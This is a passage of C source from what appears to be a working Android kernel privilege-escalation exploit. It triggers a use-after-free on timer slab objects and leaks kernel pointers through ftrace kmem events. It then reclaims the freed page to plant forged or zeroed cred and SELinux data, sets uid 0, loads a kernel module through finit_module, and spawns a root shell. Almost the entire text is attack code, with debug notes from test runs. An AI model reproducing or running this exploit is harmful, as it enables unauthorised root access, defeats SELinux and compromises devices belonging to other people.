		/* PLANT_PTR cap_effective needs A's bit16 == 1 (CAP_SYS_MODULE).
		 * A = slab + off with off < 0x2000, so bit16 comes from the slab
		 * base -- preselect bit16 slabs so a reclaim hit lands SYS_MODULE
		 * instead of relying on 50/50 retries. */
		if (g_cap_mode && !(slab & 0x10000))
			continue;
		for (int j = i; j < total; j++) {
			int b;
			if ((g_all[j] & ~UINT64_C(0x1fff)) != slab)
				break;
			b = j % 3;
			if (idx[b] < 0)
				idx[b] = j;
		}
		if (idx[0] < 0 || idx[1] < 0 || idx[2] < 0)
			continue;
		for (int b = 0; b < 3; b++) {
			g_bases[b] = idx[b];
			g_tile_off[b] = (unsigned)((g_all[idx[b]] + KITIMER_NODE) &
						   0x1fff);
		}
		/* All three armed nodes must sit in the 4 KiB half that base 0's
		 * node occupies.  The reclaim hit only proves that half
		 * (find_page_alloc(node_pfn)); an armed node in the other half
		 * keeps whatever the released slab held, and the zombie reap
		 * walks it through timerqueue_del/rb_erase -> page_request panic.
		 * Cross-half triples were selected in the 2026-11-11 22:09 run. */
		if (((g_tile_off[0] ^ g_tile_off[1]) & 0x1000) ||
		    ((g_tile_off[0] ^ g_tile_off[2]) & 0x1000)) {
			dprintf(STDOUT_FILENO,
				"[triple] skip cross-half slab=%#" PRIx64
				" off=%#x/%#x/%#x\n", slab, g_tile_off[0],
				g_tile_off[1], g_tile_off[2]);
			continue;
		}
		if (!g_cap_mode && g_no_real_cred) {
			unsigned cred_lo = g_tile_off[0] + CRED_OFF;
			unsigned cred_hi = cred_lo + GEO_CRED_SIZE;
			int overlap = 0;
			if (cred_hi > 0x1f00)
				overlap = 1;
			for (int b = 1; b < 3; b++) {
				unsigned lo = g_tile_off[b], hi = lo + 24;
				/* The fake cred and its SELinux blob must not
				 * overwrite the other armed rb_node tiles. */
				if ((lo < cred_hi && hi > cred_lo) ||
				    (lo < 0x1f20 && hi > 0x1f00))
					overlap = 1;
			}
			if (overlap) {
				dprintf(STDOUT_FILENO,
					"[triple] skip fake-cred overlap slab=%#" PRIx64
					" off=%#x/%#x/%#x\n", slab, g_tile_off[0],
					g_tile_off[1], g_tile_off[2]);
				continue;
			}
		}
		if (g_cap_mode) {
			g_tile_kind[0] = TILE_NONE;
			g_tile_kind[1] = TILE_NONE;
			g_tile_kind[2] = TILE_CRED2;  /* PLANT_PTR cap_effective */
		} else {
			g_tile_kind[0] = TILE_CRED;
			g_tile_kind[1] = TILE_SELINUX;
			g_tile_kind[2] = TILE_NONE;
		}
		dprintf(STDOUT_FILENO,
			"[triple] slab=%#" PRIx64 " idx=%d/%d/%d off=%#x/%#x/%#x\n",
			slab, g_bases[0], g_bases[1], g_bases[2], g_tile_off[0],
			g_tile_off[1], g_tile_off[2]);
		return 0;
	}
	}
	return -1;
}

/* If the reclaim failed before opening the exec gate, the victim is still
 * pre-exec: its timers and slab are live, so an ordinary kill/reap is safe.
 * Once the gate was opened the child may already own a freed slab; retain the
 * existing unproven-zombie parking behavior in that case. */
static void reclaim_miss_cleanup(pid_t child, struct vict *v)
{
	stop_helpers();
	if (ipc && !atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		if (v)
			victim_state(v, V_REAPED, "pre_exec_miss_reap");
	}
}

static int one_uaf(uint64_t target)
{
	if (g_plant_cred && !g_no_real_cred &&
	    (!g_cred_kva || (g_cred_kva >> 48) != 0xffff)) {
		dprintf(STDOUT_FILENO,
			"[uaf] invalid cred target=%#" PRIx64 "; refusing to arm\n",
			g_cred_kva);
		return -1;
	}
	double t0 = now_s();
	pid_t child;
	int code, status = 0;
	uint64_t ptrs[64];
	int nptr, ntext;
	uint64_t victim;
	struct vict *v = NULL;
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	ipc->arm_idx[0] = ipc->arm_idx[1] = ipc->arm_idx[2] = -1;
	atomic_store_explicit(&ipc->arm_ready, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->exec_ready, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->exec_entered, 0, memory_order_relaxed);
	g_tiles_on = 0;
	child = fork();
	if (child < 0) {
		dprintf(STDOUT_FILENO, "[uaf] victim fork failed errno=%d\n", errno);
		return -1;
	}
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (write_file(TRACE "/buffer_size_kb", "4096\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		dprintf(STDOUT_FILENO, "[uaf] timer trace init failed errno=%d\n", errno);
		kill(child, SIGKILL);
		stop_helpers();
		return -1;
	}
	double t_ready = now_s();
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	double t_timers = now_s();
	write_file(TRACE "/tracing_on", "0\n");
	if (collect_nth(1024, &nptr, &victim)) {
		dprintf(STDOUT_FILENO, "[uaf] timer collection failed errno=%d\n", errno);
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (g_plant_cred && pick_triple(nptr) == 0) {
		g_tiles_on = 1;
		victim = g_all[g_bases[0]];
		ipc->arm_idx[0] = g_bases[0];
		ipc->arm_idx[1] = g_bases[1];
		ipc->arm_idx[2] = g_bases[2];
	} else {
		int base = 1024 % 3;
		ipc->arm_idx[base] = 1024;
		if (!g_plant_cred)
			dprintf(STDOUT_FILENO, "[triple] single-base pass base=%d\n",
				base);
	}
	v = victim_reg(child, victim);
	if (!v) {
		/* State persistence (or ledger capacity) failed before arm_ready.
		 * The child is still pre-arm, so ordinary kill/reap is safe here. */
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	atomic_store_explicit(&ipc->arm_ready, 1, memory_order_release);
	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n")) {
		/* Post-arm failure: the killer already armed the child's timer
		 * nodes.  Its slab is still live, so a reap here is safe and
		 * better than leaving an armed zombie. */
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		if (v)
			victim_state(v, V_REAPED, "post_arm_error_reap");
		stop_helpers();
		return -1;
	}
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	double t_collect = now_s();
	if (g_plant_cred && g_no_real_cred)
		g_cred_kva = victim + KITIMER_NODE + CRED_OFF;
	if (reclaim_stream(victim, target, v)) {
		if (!getenv("PC98260_ENABLE_FALLBACK")) {
			dprintf(STDOUT_FILENO, "[uaf] page miss, retry (stream-only)\n");
			reclaim_miss_cleanup(child, v);
			return -1;
		}
		if (v && v->state != V_OPEN) {
			/* The miss was already resolved: the zombie was either
			 * reaped after a proven repair or proven foreign-owned.
			 * Neither can carry this UAF any further. */
			dprintf(STDOUT_FILENO,
				"[uaf] page miss resolved pid=%d state=%d, retry\n",
				(int)v->pid, v->state);
			reclaim_miss_cleanup(child, v);
			return -1;
		}
		dprintf(STDOUT_FILENO,
			"[uaf] stream miss; trying pipe reclaim fallback\n");
		if (!g_ncatch && prepare_catch())
			dprintf(STDOUT_FILENO, "[pipe] prepare failed\n");
		if (reclaim_pipe(victim, target) == 0) {
			dprintf(STDOUT_FILENO, "[uaf] pipe reclaim hit\n");
		} else {
			dprintf(STDOUT_FILENO,
				"[uaf] pipe miss; trying AIO reclaim fallback\n");
			uint64_t aio_target = target;
			if (!aio_target)
				aio_target = slide_addr(SELINUX_LINK) - 7;
			if (reclaim_and_plant(victim, aio_target)) {
				dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
				reclaim_miss_cleanup(child, v);
				return -1;
			}
		}
	}
	double t_reclaim = now_s();
	close_socks();
	code = wait_zombie(child, &status);
	/* wait_zombie returns 0 on timeout and -1 on waitid failure.  Neither is
	 * proof of a zombie: never fall through to the blocking waitpid below. */
	if (code <= 0) {
		dprintf(STDOUT_FILENO,
			"[uaf] child state unproven code=%d, parking instead of reaping\n",
			code);
		if (v)
			victim_state(v, V_UNPROVEN,
				code == 0 ? "zombie_timeout" : "waitid_failed");
		native_state("NO_ROOT");
		victim_watch_forever();
	}
	dprintf(STDOUT_FILENO,
		"[t] ready=%.1f timers=%.1f collect=%.1f reclaim=%.1f reap=%.1f total=%.1f\n",
		t_ready - t0, t_timers - t_ready, t_collect - t_timers,
		t_reclaim - t_collect, now_s() - t_reclaim, now_s() - t0);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (waitpid(child, &status, 0) < 0)
		return -1;
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	/* The drain has completed.  real-cred no longer needs the reclaimed page,
	 * so release queued skbs.  fake-cred is DIFFERENT: the installed FULLCAP
	 * cred lives in that page; closing the stream would free the very page
	 * the running task uses and caused the post-success panic. */
	if (!g_no_real_cred)
		close_stream();
	if (v)
		victim_state(v, V_REAPED, "planted_reap");
	{
		char eb[8] = { 0 };
		int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
		if (efd >= 0) {
			if (read(efd, eb, 1) < 0)
				eb[0] = 0;
			close(efd);
		}
		dprintf(STDOUT_FILENO, "[uaf] enforce after reap=%c\n",
			eb[0] ? eb[0] : (char)0x3f);
	}
	destroy_rings();
	stop_helpers();
	int execed = atomic_load_explicit(&ipc->exec_entered, memory_order_acquire);
	int sigkill = WIFSIGNALED(status) && WTERMSIG(status) == SIGKILL;
	int exec_ok = WIFEXITED(status) && WEXITSTATUS(status) == 0 && execed;
	if (!sigkill && !exec_ok) {
		dprintf(STDOUT_FILENO,
			"[uaf] reap not proven post-exec status=%d execed=%d\n",
			status, execed);
		return -1;
	}
	if (exec_ok && !sigkill)
		dprintf(STDOUT_FILENO, "[uaf] accepted exec-ok reap status=%d\n", status);
	return 0;
}

/* PORT: real uid 取自 /proc/self/status 的 "Uid:" 行（读 real_cred），
 * 而 getuid() 读的是 task->cred。两者分开才能验证 real_cred 是否装好。 */
static unsigned real_uid_from_status(void)
{
	char line[256];
	unsigned v = ~0u;
	FILE *f = fopen("/proc/self/status", "r");
	if (!f)
		return v;
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, "Uid:", 4)) {
			unsigned a = ~0u;
			if (sscanf(line + 4, "%u", &a) == 1)
				v = a;
			break;
		}
	}
	fclose(f);
	return v;
}

#define MINT_RFD 3
#define MINT_WFD 4

/* real-cred child: exec this same binary into "mintwait" so the exec allocates
 * a private REAL cred (prepare_creds, callsite low21 0x19c474, bytes_req 0xb8)
 * that the parent then zeroes in place.  Pipes ride fixed fds 3/4 across exec. */
static void cred_child(void)
{
	setpgid(0, 0);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	if (dup2(g_wake[0], MINT_RFD) != MINT_RFD ||
	    dup2(g_report[1], MINT_WFD) != MINT_WFD)
		_exit(4);
	{
		char *const argv[] = {
			(char *)"/proc/self/exe",
			getenv("PC98260_ROOTD") ? (char *)"mintwait-rootd" :
						  (char *)"mintwait", NULL };
		execve("/proc/self/exe", argv, environ);
	}
	_exit(5);
}

/* mintwait image: the exec already committed the private real cred.  Ack the
 * parent, then serve queries; on 'k' the uid/gid have been zeroed, so
 * setuid(0) is accepted (kuid == old uid) and yields a standard root process
 * that can fork/exec and be killed -- no resident daemon needed. */
static int mintwait_main(int rootd_mode)
{
	if (write(MINT_WFD, "M", 1) != 1)
		return 6;
	for (;;) {
		unsigned char go;
		if (read(MINT_RFD, &go, 1) != 1)
			return 0;
		if (go == 'k') {
			/* fake-cred already carries uid=0/euid=0 from the installed
			 * page; calling setuid there would run prepare_creds() over a
			 * forged cred + zero SELinux blob and is the step right before
			 * the post-success panic.  real-cred still needs the raise. */
			dprintf(STDOUT_FILENO,
				"[cred] takeover uid=%u euid=%u gid=%u egid=%u\n",
				getuid(), geteuid(), getgid(), getegid());
			if (geteuid() != 0 || getuid() != 0) {
				(void)syscall(SYS_setgid, 0);
				(void)syscall(SYS_setuid, 0);
				(void)syscall(SYS_setfsgid, 0);
				(void)syscall(SYS_setfsuid, 0);
				dprintf(STDOUT_FILENO, "[cred] takeover ids raised\n");
			} else {
				dprintf(STDOUT_FILENO, "[cred] takeover ids already zero\n");
			}
			{
				const char *fko = getenv("PC98260_FINIT_KO");
				if (fko && *fko) {
					const char *pfile = getenv("PC98260_FINIT_PARAMS_FILE");
					char pbuf[256] = "";
					int wfd = -1, w;
					long frc = -1;
					int ferr = 0;
					if (pfile && *pfile) {
						int pfd = open(pfile, O_RDONLY | O_CLOEXEC);
						if (pfd >= 0) {
							ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
							if (pn > 0) {
								pbuf[pn] = 0;
								char *nl = strchr(pbuf, '\n');
								if (nl) *nl = 0;
							}
							close(pfd);
						}
					}
					{
						const char *fready = getenv("PC98260_FINIT_READY");
						for (w = 0; w < 180; w++) {
							if (!fready || !*fready ||
							    access(fready, F_OK) == 0) {
								wfd = open(fko, O_RDONLY | O_CLOEXEC);
								if (wfd >= 0) break;
							}
							sleep(1);
						}
					}
					if (wfd < 0) {
						ferr = errno;
					} else {
						errno = 0;
						frc = syscall(SYS_finit_module, wfd, pbuf, 0);
						ferr = errno;
						close(wfd);
					}
					dprintf(STDOUT_FILENO,
						"[ksu] in-process finit_module rc=%ld errno=%d uid=%u euid=%u\n",
						frc, ferr, getuid(), geteuid());
					if (frc == 0) {
						const char *fe = getenv("PC98260_FINIT_EXIT");
						if (fe && fe[0] == '1') _exit(0);
					}
				}
			}
			if (rootd_mode) {
				/* App runner compatibility only: this is a normal real-cred
				 * process, not a fake-cred page keeper.  Finalize kills the
				 * listener; standalone mode never enters this branch. */
				dprintf(STDOUT_FILENO,
					"[cred] starting temporary real-cred command handoff\n");
				_exit(pc98260_run_rootd());
			}
			{
				char *const av[] = { (char *)"sh", NULL };
				char *const ep[] = {
					(char *)"PATH=/system/bin:/vendor/bin:/data/local/tmp",
					(char *)"HOME=/", NULL };
				execve("/system/bin/sh", av, ep);
			}
			_exit(0);
		}
		{
			char msg[160];
			int n = snprintf(msg, sizeof(msg),
				"uid=%u euid=%u gid=%u egid=%u\n",
				getuid(), geteuid(), getgid(), getegid());
			(void)write(MINT_WFD, msg, (size_t)n);
		}
	}
}

/* The trigger file may accept a write without actually installing the
 * command (EEXIST is treated as success by trigger_cmd).  Verify the arm
 * before spending a fork/exec on the capture.
 *
 * Do NOT read events/kmem/kmem_cache_alloc/enable here: on Android that file
 * is not readable from the shell domain (EACCES with SELinux enforcing) even
 * though the trigger file is writable, so such a check can never pass.  The
 * trigger file does list the installed command as
 * "enable_event:kmem:kmem_cache_alloc:unlimited". */
static int cred_trigger_armed(void)
{
	char buf[1024];
	int fd = open(TRACE "/events/kmem/rss_stat/trigger",
		      O_RDONLY | O_CLOEXEC);
	int r;
	if (fd < 0)
		return -1;
	r = (int)read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (r <= 0)
		return -1;
	buf[r] = 0;
	return strstr(buf, "enable_event:kmem:kmem_cache_alloc") != NULL;
}

/* Release a mintwait child that never got the go command.  EOF on its wake
 * pipe makes mintwait_main return and exit normally. */
static void release_mint_child(void)
{
	int st;
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	if (g_cred_child_pid <= 0)
		return;
	for (int i = 0; i < 30; i++) {
		if (waitpid(g_cred_child_pid, &st, WNOHANG) == g_cred_child_pid) {
			g_cred_child_pid = -1;
			return;
		}
		usleep(100000);
	}
	kill(g_cred_child_pid, SIGKILL);
	waitpid(g_cred_child_pid, &st, 0);
	g_cred_child_pid = -1;
}

/* One capture attempt.  A miss leaves no kernel state behind (the trace is
 * only read), so the wrapper may retry a few times. */
static int leak_real_cred_once(void)
{
	struct pollfd pfd;
	char ack;
	uint64_t ptrs[32];
	int n, seen = 0;

	if (pipe(g_wake) || pipe(g_report))
		return -1;
	g_cred_site = slide_addr(LINK_ALLOC_CRED);
	write_file(TRACE "/buffer_size_kb", "4096\n");
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on())
		return -1;
	if (cred_trigger_armed() != 1) {
		dprintf(STDOUT_FILENO,
			"[cred] kmem trigger missing after arm; re-arming\n");
		trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
		if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") ||
		    kick_rss() || trace_off_on() ||
		    cred_trigger_armed() != 1) {
			dprintf(STDOUT_FILENO,
				"[cred] kmem trigger unavailable; capture skipped\n");
			write_file(TRACE "/tracing_on", "0\n");
			return -1;
		}
	}
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 3000) <= 0 ||
	    read(g_report[0], &ack, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] mint ack missing pid=%d\n",
			g_cred_child_pid);
		release_mint_child();
		return -1;
	}
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site_pid(g_cred_site, GEO_CRED_SIZE,
		(int)g_cred_child_pid, ptrs, 32, &seen);
	g_selftest_cred += seen;
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n < 1) {
		dprintf(STDOUT_FILENO,
			"[cred] no real cred for pid=%d (site recs=%d)\n",
			g_cred_child_pid, seen);
		release_mint_child();
		return -1;
	}
	/* the mint is synchronous with the ack: the child's own last record. */
	g_cred_kva = ptrs[n - 1];
	dprintf(STDOUT_FILENO,
		"[cred] pid=%d real cred=%#" PRIx64 " site_recs=%d pid_recs=%d\n",
		g_cred_child_pid, g_cred_kva, seen, n);
	return 0;
}

static void diag_print_sites(const char *tag, struct diag_site *arr, int n,
			     uint64_t link);

/* Capture is read-only and happens before any UAF.  A transient empty trace
 * aborted the whole chain in the 19:06 run even though the same boot could
 * capture successfully; retry a bounded number of times instead of failing
 * the run on one miss. */
static int leak_real_cred(void)
{
	for (int attempt = 1; attempt <= 3; attempt++) {
		if (leak_real_cred_once() == 0)
			return 0;
		if (attempt < 3) {
			dprintf(STDOUT_FILENO,
				"[cred] capture miss; retry %d/3\n", attempt + 1);
			sleep(1);
		}
	}
	dprintf(STDOUT_FILENO,
		"[cred] capture diagnostics raw=%zu cred_recs=%d timer_recs=%d expected_hits=%d pid_hits=%d\n",
		g_diag_raw, g_diag_cred_size_recs, g_diag_timer_size_recs,
		g_diag_expected_hits, g_diag_pid_hits);
	diag_print_sites("cred", g_diag_cred_sites, g_diag_cred_nsites,
			 CRED_LINK);
	diag_print_sites("timer", g_diag_timer_sites, g_diag_timer_nsites,
			 TIMER_LINK);
	return -1;
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

/* PORT: 显式让子进程装 KSU 并起 rootd（原来这一步是自动触发的）。 */
static unsigned long long child_capeff(void)
{
	char path[64], line[256];
	unsigned long long v = 0;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
	FILE *f = fopen(path, "r");
	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f))
		if (!strncmp(line, "CapEff:", 7)) {
			(void)sscanf(line + 7, "%llx", &v);
			break;
		}
	fclose(f);
	return v;
}

static void start_child_ksu(void)
{
	unsigned char go = 'k';
	if (g_wake[1] < 0)
		return;
	if (write(g_wake[1], &go, 1) == 1)
		dprintf(STDOUT_FILENO, "[cred] asked child to take over (KSU)\n");
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	/* PORT (2026-10-26 实测): 不能用 kill(pid, 0) 判断存活。
	 * 装上 fake cred 后，该 task 的 SELinux SID 来自我们造的零页
	 * （kernel SID）；SELinux 一旦回到 Enforcing，kill() 返回 EPERM
	 * (errno=1) 而不是 ESRCH —— 进程明明活着却被判死，导致
	 * real_cred 那一跳的验收永远失败（还会白烧 4 次 UAF）。
	 * 只看 waitpid 是否真的收尸，其余交给写管道 + poll 的真实信号。 */
	{
		int st = 0;
		if (waitpid(g_cred_child_pid, &st, WNOHANG) == g_cred_child_pid) {
			dprintf(STDOUT_FILENO,
				"[cred] child %d really exited\n", g_cred_child_pid);
			log_proc_uid(g_cred_child_pid);
			return -1;
		}
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2) {
		const char *rp = strstr(buf, " r=");
		g_child_ruid = rp ? (unsigned)strtoul(rp + 3, NULL, 10) : ~0u;
		return 0;
	}
	return -1;
}

#define MAX_TASK_CAND 16
static uint64_t g_tasks[MAX_TASK_CAND];
static uint64_t g_tsites[MAX_TASK_CAND];
static int g_ntasks;

/* PORT: task_struct cache objsize 是 slab cache 的取整尺寸
 * （madrid: 5760），不是 sizeof(struct task_struct)（4736）。
 * /proc/slabinfo 对 shell 可读，运行期核对一次，避免换构建后
 * 用错尺寸导致 leak_task 静默"leak failed"。 */
static void slab_task_objsize(void)
{
	char line[512];
	FILE *f = fopen("/proc/slabinfo", "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		unsigned long act, num, objsize;
		if (strncmp(line, "task_struct ", 12))
			continue;
		if (sscanf(line + 12, "%lu %lu %lu", &act, &num, &objsize) == 3 &&
		    objsize > 0) {
			if ((uint64_t)objsize != g_task_obj)
				dprintf(STDOUT_FILENO,
					"[slab] task_struct objsize=%lu (header said %lu), "
					"using live value\n",
					objsize, (unsigned long)g_task_obj);
			g_task_obj = (uint64_t)objsize;
		}
		break;
	}
	fclose(f);
}

static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0;
	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on())
		return -1;
	/* PORT (self-test): 强制一次 cred 分配。setuid 到不同 uid 会先
	 * prepare_creds() 分配新 cred，再做权限检查并 EPERM —— 分配记录
	 * 留在 trace 里，正好用来验证 LINK_ALLOC_CRED+slide 是否对得上。 */
	g_cred_site = slide_addr(LINK_ALLOC_CRED);
	(void)setuid(4242);
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	buf = malloc(4U << 20);
	if (!buf)
		return -1;
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&req, buf + i + 16, 8);
			memcpy(&site, buf + i, 8);
			/* PORT (self-test): 数一下 cred 分配，验证 call site 常量 */
			if (req == GEO_CRED_SIZE && site == g_cred_site) {
				g_selftest_cred++;
				continue;
			}
			/* PORT: slab objsize, not sizeof(struct task_struct) */
			if (req != g_task_obj)
				continue;
			memcpy(&ptr, buf + i + 8, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			/* A page-aligned pointer cannot be a slab object; those come
			   from order-N allocations that share the 5760-byte size class
			   and would send task->cred into the wrong page. Keep the first
			   slab-looking candidate instead of the last record seen. */
			/* Several task_struct-sized allocations are live at any time
			   (other processes fork too), so keep every candidate and let
			   the cred loop walk them instead of retrying one wrong one. */
			{
				int dup = 0;
				for (int k = 0; k < g_ntasks; k++)
					if (g_tasks[k] == ptr)
						dup = 1;
				if (!dup &&
				    g_ntasks < (int)(sizeof(g_tasks) / sizeof(g_tasks[0]))) {
					g_tsites[g_ntasks] = site;
					g_tasks[g_ntasks] = ptr;
					g_ntasks++;
				}
			}
			hits++;
			dprintf(STDOUT_FILENO, "[task] site=%#" PRIx64 " ptr=%#" PRIx64 "\n",
				site, ptr);
		}
	}
	free(buf);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	if (!g_ntasks)
		return -1;
	/* The task_struct allocation happens at one fixed call site, so the
	   busiest site is the fork path; a 5760-byte record from any other call
	   site belongs to some unrelated allocation of the same size class. */
	if (g_ntasks > 1) {
		int best = 0, best_count = 0;
		for (int i = 0; i < g_ntasks; i++) {
			int c = 0;
			for (int j = 0; j < g_ntasks; j++)
				if (g_tsites[j] == g_tsites[i])
					c++;
			if (c > best_count) {
				best_count = c;
				best = i;
			}
		}
		if (best_count > 1) {
			uint64_t order[MAX_TASK_CAND];
			uint64_t site = g_tsites[best];
			int n = 0;
			for (int i = 0; i < g_ntasks; i++)
				if (g_tsites[i] == site)
					order[n++] = g_tasks[i];
			for (int i = 0; i < g_ntasks; i++)
				if (g_tsites[i] != site)
					order[n++] = g_tasks[i];
			for (int i = 0; i < g_ntasks; i++)
				g_tasks[i] = order[i];
			dprintf(STDOUT_FILENO, "[task] busiest site=%#" PRIx64 " x%d\n",
				site, best_count);
		}
	}
	g_task = g_tasks[0];
	dprintf(STDOUT_FILENO, "[task] %d candidate(s), first=%#" PRIx64 "\n",
		g_ntasks, g_task);
	return 0;
}

static int leak_cred(uint64_t *cred)
{
	uint64_t ptrs[8];
	int n;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss())
		return -1;
	if (trace_off_on())
		return -1;
	if (syscall(SYS_setresuid, -1, -1, -1))
		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site(slide_addr(CRED_LINK), 184, ptrs, 8);
	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n < 1)
		return -1;
	*cred = ptrs[n - 1];
	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
	return 0;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[selinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0) {
		buf[strcspn(buf, "\r\n")] = 0;
		dprintf(STDOUT_FILENO, "[selinux] enforce=%s\n", buf);
	}
	close(fd);
}



